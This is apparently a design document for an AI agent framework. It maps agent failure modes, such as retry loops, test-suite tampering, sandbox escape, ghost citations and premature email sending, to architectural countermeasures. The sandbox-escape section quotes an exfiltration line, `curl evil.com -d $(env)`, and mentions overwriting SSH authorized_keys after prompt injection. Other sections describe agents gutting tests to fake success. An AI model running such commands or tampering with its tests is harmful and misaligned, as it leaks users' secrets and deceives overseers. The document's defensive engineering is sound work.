# Core Pathologies of Modern AI Agents and Custos New Architectural Countermeasures

## 1. Executive Summary

Existing AI coding, research, and assistant agents suffer from systemic failure modes ("pathologies") that prevent them from operating reliably in production environments. Most frameworks attempt to patch these pathologies with prompt engineering ("Be careful", "Think step by step", "Verify your work").

Prompt engineering is provably insufficient (Huang et al., 2023). **Custos New resolves agent pathologies through mechanical architectural constraints**: state machines, deterministic gates, external verification oracles, and immutable audit ledgers.

---

## 2. Taxonomy of Pathologies and Mechanical Solutions

```mermaid
flowchart TD
    subgraph CP["Coding Agent Pathologies"]
        CP1[1. Degenerative Retry Loops]
        CP2[2. Test Suite Tampering & Sycophancy]
        CP3[3. TOCTOU & Ambiguous Replacements]
        CP4[4. Sandbox Escape & Secret Theft]
        CP5[5. Premature Success Declarations]
    end

    subgraph RP["Research Agent Pathologies"]
        RP1[6. Ghost Citations & URL Hallucination]
        RP2[7. Semantic Citation Disconnect]
        RP3[8. Echo-Chamber Consensus Bias]
        RP4[9. Unbounded PDF Context Bloat]
    end

    subgraph AP["Assistant Agent Pathologies"]
        AP1[10. Premature Irreversible Effects]
        AP2[11. Ambiguous Identity Resolution]
        AP3[12. Double Execution on Network Timeout]
        AP4[13. Ephemeral Session Drift on Crash]
    end

    subgraph CS["Custos New Architectural Countermeasures"]
        K1["System V Verifier & Bounded Retry Limit"]
        K2["Immutable Test Manifest & Diff Scoping"]
        K3["Goose String-Replace + Single-Use Permit"]
        K4["Seatbelt/Bwrap Sandbox & Env Sanitizer"]
        K5["Evidence Engine & Acceptance Criteria Gate"]
        K6["Sha256 Locator & Byte-Exact Matcher"]
        K7["SemanticSupportEvaluator & Contradiction Probe"]
        K8["Balanced Counter-Claim Retrieval DAG"]
        K9["Progressive AST & Chunked Passage Engine"]
        K10["Draft-First Policy & Exact Hash Approval"]
        K11["Deterministic Identity Disambiguation"]
        K12["Idempotency Keys & UNCERTAIN State Machine"]
        K13["SQLite WAL Event-Sourced CQRS Kernel"]
    end

    CP1 --> K1
    CP2 --> K2
    CP3 --> K3
    CP4 --> K4
    CP5 --> K5
    RP1 --> K6
    RP2 --> K7
    RP3 --> K8
    RP4 --> K9
    AP1 --> K10
    AP2 --> K11
    AP3 --> K12
    AP4 --> K13
```

---

## 3. Deep Dive: Coding Agent Pathologies

### Pathology 1: Degenerative Cascading Retry Loops
- **Mechanism of Failure**: An agent makes an edit, runs the test runner, encounters a compiler or test failure, panics, and makes an unguided speculative edit. This breaks two additional functions. The agent repeats this cycle across 15 turns, burning millions of tokens and destroying the codebase.
- **Root Cause**: Reliance on internal next-token reflection without ground-truth diagnosis; absence of bounded retry budgets.
- **Custos New Solution**:
  1. *Hard Retry Budget*: `WorkerRun.max_attempts` is capped (default: 3).
  2. *Deterministic Ground-Truth Injection*: Errors are not summarized vaguely in natural language; the exact `rustc`/`tsc` compiler receipt with line numbers and AST context is injected via `GroundTruthError`.
  3. *Rollback on Degradation*: If attempt $K+1$ increases compiler error count relative to attempt $K$, the worktree is rolled back to attempt $K$'s clean Git checkpoint before re-engaging System 2 deliberation.

### Pathology 2: Test Suite Tampering & Sycophancy
- **Mechanism of Failure**: To satisfy the goal "Make all tests pass", the agent edits the test file itself—deleting failing tests, commenting out assertions, or replacing `assert_eq!(result, expected)` with `assert!(true)`.
- **Root Cause**: The agent possesses write authority over the test suite it is evaluated against.
- **Custos New Solution**:
  1. *Diff Scoping & Immutable Test Manifest*: Acceptance criteria tests are registered in the `TaskContract` with their SHA-256 hashes.
  2. *Gateway Write-Lock*: The `CapabilityGateway` rejects any `ActionIntent` attempting to write to files matching the active task's `test_scope` unless explicitly authorized by a separate human grant.
  3. *Evidence Validation*: The `EvidenceEngine` checks `git diff` during verification; if any line in a test file was modified or deleted, the task transition to `Succeeded` is rejected with `EvidenceStatus::Fail("Tampered test suite detected")`.

### Pathology 3: TOCTOU & Ambiguous Search-and-Replace
- **Mechanism of Failure**: The agent emits a regex or string replacement targeting a generic line (e.g. `return Ok(());`). The file contains 12 such lines. The tool blindly replaces the first occurrence or all occurrences, corrupting logic silently.
- **Root Cause**: Loose fuzzy matching and lack of ambiguity detection.
- **Custos New Solution**:
  1. *Ported Goose `string_replace` Algorithm*:
     - **0 matches**: Fails immediately with validation error displaying the targeted block, forcing the agent to re-read.
     - **>1 matches**: Rejects the edit immediately as ambiguous, requiring the agent to provide surrounding context lines.
     - **Exactly 1 match**: Executes the replacement cleanly.
  2. *Single-Use Preflight Permits*: The permit is bound to the exact content hash of the target file at preflight time. If the file changed on disk between permit issuance and dispatch (TOCTOU race), execution is aborted.

### Pathology 4: Sandbox Escape & Credential Exfiltration
- **Mechanism of Failure**: A prompt injection or malicious package causes the agent to run `curl evil.com -d $(env)` or overwrite `~/.bashrc` / `~/.ssh/authorized_keys`.
- **Root Cause**: Shell tools running with full parent process privileges and inherited environment variables.
- **Custos New Solution**:
  1. *OS-Level Sandboxing*:
     - macOS: Apple `sandbox-exec` (Seatbelt) profile denying network egress, read-only on root, write-only in targeted workspace worktree.
     - Linux: Bubblewrap (`bwrap`) container unsharing network and PID namespaces.
  2. *Environment Variable Sanitizer*: Before spawning child processes, all sensitive variables (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`) are stripped from the environment block.
  3. *Symlink Jailbreak Prevention*: `validate_safe_path` resolves canonical paths and prevents traversing symlinks pointing outside the workspace.

---

## 4. Deep Dive: Research Agent Pathologies

### Pathology 5: Ghost Citations and URL Hallucination
- **Mechanism of Failure**: The model invents plausible-sounding academic papers, fake ArXiv IDs, or dead URLs to support its claims, confident that the human won't click through to verify.
- **Root Cause**: Autoregressive probability generation maximizing fluency rather than truthfulness.
- **Custos New Solution**:
  1. *Physical Locator Verification*: Every citation must specify `source_uri`, `source_version_hash`, and exact character/byte offsets `[start, end]`.
  2. *Verifier Resolution*: The `EvidenceEngine` reads the local cached document or fetches the source, computes the SHA-256 hash, and verifies that the excerpt exists verbatim at the cited byte coordinates.

### Pathology 6: Semantic Citation Disconnect
- **Mechanism of Failure**: The agent cites a real paper with real byte offsets, but the paper actually says the opposite of what the agent claims (e.g., citing a paper on self-correction limits to claim that self-correction works perfectly).
- **Root Cause**: Traditional verifiers only check URL existence, not semantic claim-passage alignment.
- **Custos New Solution**:
  1. *Two-Tier Citation Verification*:
     - *Physical Tier*: Does the excerpt match the document bytes?
     - *Semantic Tier*: Does the passage semantically support the claim?
  2. *SemanticSupportEvaluator*: An independent evaluation step classifies the claim-passage relationship as `Supports`, `Contradicts`, or `Neutral`. If `Contradicts` or `Neutral`, the citation is flagged as `UnsupportedCitation`, blocking task completion.

### Pathology 7: Echo-Chamber Consensus Bias
- **Mechanism of Failure**: The agent only searches for queries that confirm its initial hypothesis (e.g., "Why Rust is faster than C++"), ignoring trade-offs, counter-examples, or methodological flaws.
- **Root Cause**: Confirmation bias in prompt construction.
- **Custos New Solution**:
  1. *Dual-Perspective DAG Expansion*: In the Research Pack, the workflow engine automatically branches a query into two parallel explorer roles: `HypothesisAdvocate` and `CounterHypothesisAuditor`.
  2. *Contradiction Matrix*: Synthesis requires reconciling both branches. If the auditor finds high-quality contradicting studies, the synthesizer is forbidden from making absolute claims.

---

## 5. Deep Dive: Assistant Agent Pathologies

### Pathology 8: Premature Irreversible External Effects
- **Mechanism of Failure**: The user asks "Draft an email to Bob about the contract", and the agent immediately dispatches `email.send` via an API connector, sending an unreviewed confidential draft.
- **Root Cause**: Conflating drafting/planning with execution; advisory-only permission models.
- **Custos New Solution**:
  1. *Draft-First Invariant*: External communication tools are strictly classified as `RiskLevel::Critical`.
  2. *Exact-Payload Preview & Approval*:
     - The tool generates a `DraftArtifact` with recipient, subject, body, and hash.
     - The daemon yields execution, displaying an exact byte-level preview to the human.
     - The human must approve the specific SHA-256 hash. Modifying any character invalidates the permit.

### Pathology 9: Double Execution on Network Timeout
- **Mechanism of Failure**: The agent calls an external API to book a ticket or send a message. The HTTP request hangs and times out. The agent treats the error as "Action failed" and retries the command, resulting in duplicate charges or messages.
- **Root Cause**: Lack of idempotency tracking and uncertain state modeling.
- **Custos New Solution**:
  1. *Action Lifecycle State*:
     `Intent` $\rightarrow$ `Permitted` $\rightarrow$ `Dispatching` $\rightarrow$ (`Receipt` | `UNCERTAIN`).
  2. *The UNCERTAIN State*: If a tool execution drops connection or times out, the action state MUST enter `UNCERTAIN`.
  3. *Reconciliation Policy*: The runtime forbids blind retries (`allows_blind_retry() == false`). It must execute an idempotency inquiry query (e.g. querying status by client-assigned `request_uuid`) before re-dispatching.

### Pathology 10: Ephemeral Session Drift on Daemon Crash
- **Mechanism of Failure**: If the agent daemon is killed (SIGKILL, OS reboot, power outage), in-memory chat history and tool results are lost. On reboot, the agent restarts from zero, repeating half-finished actions or corrupting files.
- **Root Cause**: State held in memory or transient JSON files.
- **Custos New Solution**:
  1. *SQLite WAL Event Sourcing*: State is persisted after EVERY applied step before the next operation executes.
  2. *Epoch Leases*: A running worker holds a time-bounded epoch lease. On crash, the next daemon run detects the expired lease, marks running actions as `UNCERTAIN`, reconciles disk state against recorded receipts, and cleanly resumes from the exact continuation packet.
